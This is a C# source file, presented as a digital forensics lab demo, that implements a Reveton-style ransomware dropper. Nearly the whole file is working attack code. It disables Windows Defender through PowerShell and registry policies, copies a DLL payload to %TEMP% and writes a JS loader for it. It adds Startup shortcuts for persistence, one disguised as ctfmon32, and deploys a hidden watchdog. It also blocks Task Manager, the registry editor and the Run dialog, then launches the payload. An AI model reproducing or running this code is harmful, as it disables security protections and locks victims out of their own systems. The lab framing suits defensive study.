// RevetonDropper.cs — NT334 Digital Forensics Lab
// Simulates the Reveton EXE dropper's persistence + anti-tampering:
//   - Auto-disables Windows Defender (exclusion + registry policies)
//   - Copies DLL payload to %TEMP% with random name
//   - Creates runctf.lnk in Startup folder (persistence)
//   - Drops .pad config + .js loader in %APPDATA%
//   - Deploys LockerGuard.exe watchdog (blocks Task Manager, CMD, etc.)
//   - Sets DisableTaskMgr + DisableRegistryTools registry policies
//   - Executes the DLL payload via rundll32
//
// Recovery: Safe Mode -> remove Startup items -> delete files -> fix registry
//
// Compilation (32-bit, .NET Framework 4.0):
//   %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /platform:x86 /reference:Microsoft.CSharp.dll RevetonDropper.cs
//
// Usage: RevetonDropper.exe [path\to\sample.dll]

using System;
using System.IO;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;

class RevetonDropper
{
    static Random rng = new Random();

    static string RandomHexName(int byteCount)
    {
        byte[] bytes = new byte[byteCount];
        rng.NextBytes(bytes);
        StringBuilder sb = new StringBuilder(byteCount * 2);
        foreach (byte b in bytes)
            sb.Append(b.ToString("x2"));
        return sb.ToString();
    }

    static void CreateLnk(string lnkPath, string targetExe, string arguments)
    {
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        if (shellType == null)
        {
            string batPath = Path.ChangeExtension(lnkPath, ".bat");
            File.WriteAllText(batPath,
                "@echo off\r\nstart \"\" \"" + targetExe + "\" " + arguments + "\r\n");
            return;
        }
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic shortcut = shell.CreateShortcut(lnkPath);
        shortcut.TargetPath = targetExe;
        shortcut.Arguments = arguments;
        shortcut.WindowStyle = 7;
        shortcut.Description = "CTF Runtime";
        shortcut.Save();
    }

    static void RunPowershell(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -Command " + command;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            p.WaitForExit(10000);
        }
        catch { }
    }

    static void DisableDefender()
    {
        RunPowershell("\"Add-MpExclusion -Path 'C:\\'\"");
        Console.WriteLine("[+] Defender exclusion added: C:\\");

        RunPowershell("\"Set-MpPreference -DisableRealtimeMonitoring $true\"");
        Console.WriteLine("[+] Real-time monitoring disabled");

        try
        {
            RegistryKey wdKey = Registry.LocalMachine.CreateSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows Defender");
            if (wdKey != null)
            {
                wdKey.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                wdKey.Close();
            }
            RegistryKey rtKey = Registry.LocalMachine.CreateSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
            if (rtKey != null)
            {
                rtKey.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                rtKey.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                rtKey.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                rtKey.Close();
            }
            Console.WriteLine("[+] Defender registry policies set");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Defender registry FAILED: " + ex.Message);
        }
    }

    static void SetRegistryLockdown()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key != null)
            {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                key.Close();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Registry policy (System) FAILED: " + ex.Message);
        }

        try
        {
            RegistryKey key2 = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            if (key2 != null)
            {
                key2.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key2.Close();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Registry policy (Explorer) FAILED: " + ex.Message);
        }
    }

    static void Main(string[] args)
    {
        Console.WriteLine("============================================");
        Console.WriteLine("  Reveton Dropper Simulator v2");
        Console.WriteLine("  NT334 - Digital Forensics Lab Demo");
        Console.WriteLine("  FOR EDUCATIONAL USE IN ISOLATED VM ONLY");
        Console.WriteLine("============================================\n");

        string sourceDll;
        if (args.Length > 0)
            sourceDll = Path.GetFullPath(args[0]);
        else
            sourceDll = Path.Combine(Directory.GetCurrentDirectory(), "sample.dll");

        if (!File.Exists(sourceDll))
        {
            Console.WriteLine("[!] DLL not found: " + sourceDll);
            return;
        }

        string selfDir = Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);
        string guardSource = Path.Combine(selfDir, "LockerGuard.exe");
        bool hasGuard = File.Exists(guardSource);

        Console.WriteLine("[*] Step 0 - Disabling Windows Defender...");
        DisableDefender();
        Console.WriteLine("[+] Step 0 - Defender neutralized\n");

        Console.WriteLine("[*] Source DLL : " + sourceDll);
        Console.WriteLine("[*] DLL size   : " + new FileInfo(sourceDll).Length + " bytes");
        Console.WriteLine("[*] Guard      : " + (hasGuard ? guardSource : "NOT FOUND (skipping)") + "\n");

        string randId = RandomHexName(6);
        Console.WriteLine("[*] Generated random ID: " + randId + "\n");

        string appData    = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localTemp  = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");
        string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

        // === STEP 1: Copy DLL to %TEMP% ===
        string dllDest = Path.Combine(localTemp, randId + ".dll");
        try
        {
            File.Copy(sourceDll, dllDest, true);
            Console.WriteLine("[+] Step 1 - DLL copied to: " + dllDest);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Step 1 FAILED: " + ex.Message);
            return;
        }

        // === STEP 2: Drop .pad config ===
        string padFile = Path.Combine(appData, randId + ".pad");
        try
        {
            byte[] padData = new byte[512];
            rng.NextBytes(padData);
            byte[] header = Encoding.ASCII.GetBytes("RVTN");
            Array.Copy(header, padData, header.Length);
            File.WriteAllBytes(padFile, padData);
            Console.WriteLine("[+] Step 2 - Config dropped: " + padFile);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Step 2 FAILED: " + ex.Message);
        }

        // === STEP 3: Drop .js loader ===
        string jsFile = Path.Combine(appData, randId + ".js");
        try
        {
            string jsContent =
                "// Reveton loader - executes DLL payload on startup\r\n" +
                "var wsh = new ActiveXObject('WScript.Shell');\r\n" +
                "wsh.Run('rundll32.exe \"" + dllDest.Replace("\\", "\\\\") +
                "\" DllMain', 0, false);\r\n";
            File.WriteAllText(jsFile, jsContent, Encoding.UTF8);
            Console.WriteLine("[+] Step 3 - Loader dropped: " + jsFile);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Step 3 FAILED: " + ex.Message);
        }

        // === STEP 4: Startup persistence - runctf.lnk ===
        string lnkPath = Path.Combine(startupDir, "runctf.lnk");
        try
        {
            CreateLnk(lnkPath, "rundll32.exe", "\"" + dllDest + "\" DllMain");
            Console.WriteLine("[+] Step 4 - Startup persistence: " + lnkPath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Step 4 FAILED: " + ex.Message);
        }

        // === STEP 5: Deploy LockerGuard watchdog ===
        string guardDest = Path.Combine(localTemp, randId + "_guard.exe");
        if (hasGuard)
        {
            try
            {
                File.Copy(guardSource, guardDest, true);
                Console.WriteLine("[+] Step 5 - Guard deployed: " + guardDest);

                string guardLnk = Path.Combine(startupDir, "ctfmon32.lnk");
                CreateLnk(guardLnk, guardDest, "\"" + dllDest + "\"");
                Console.WriteLine("[+] Step 5 - Guard persistence: " + guardLnk);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Step 5 FAILED: " + ex.Message);
            }
        }
        else
        {
            Console.WriteLine("[~] Step 5 - Guard skipped (LockerGuard.exe not found)");
        }

        // === STEP 6: Registry lockdown ===
        Console.WriteLine("[*] Step 6 - Setting registry lockdown policies...");
        SetRegistryLockdown();
        Console.WriteLine("[+] Step 6 - DisableTaskMgr, DisableRegistryTools, NoRun set");

        // === SUMMARY ===
        Console.WriteLine("\n--- Artifacts Created ---");
        Console.WriteLine("  DLL payload  : " + dllDest);
        Console.WriteLine("  Config .pad  : " + padFile);
        Console.WriteLine("  Loader .js   : " + jsFile);
        Console.WriteLine("  Startup .lnk : " + lnkPath);
        if (hasGuard)
        {
            Console.WriteLine("  Guard .exe   : " + guardDest);
            Console.WriteLine("  Guard .lnk   : " + Path.Combine(startupDir, "ctfmon32.lnk"));
        }
        Console.WriteLine("  Registry     : HKCU\\...\\Policies\\System\\DisableTaskMgr=1");
        Console.WriteLine("                 HKCU\\...\\Policies\\System\\DisableRegistryTools=1");
        Console.WriteLine("                 HKCU\\...\\Policies\\Explorer\\NoRun=1");

        // === STEP 7: Launch payload + guard ===
        Console.WriteLine("\n[*] Step 7 - Launching payload...");
        try
        {
            Process.Start("rundll32.exe", "\"" + dllDest + "\",DllMain");
            Console.WriteLine("[+] Payload launched.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Payload launch FAILED: " + ex.Message);
        }

        if (hasGuard && File.Exists(guardDest))
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = guardDest;
                psi.Arguments = "\"" + dllDest + "\"";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Console.WriteLine("[+] Guard launched (hidden).");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Guard launch FAILED: " + ex.Message);
            }
        }

        Console.WriteLine("\n[*] Infection complete. System locked.");
        Console.WriteLine("[*] Recovery: Safe Mode -> remove Startup items -> fix registry");
    }
}
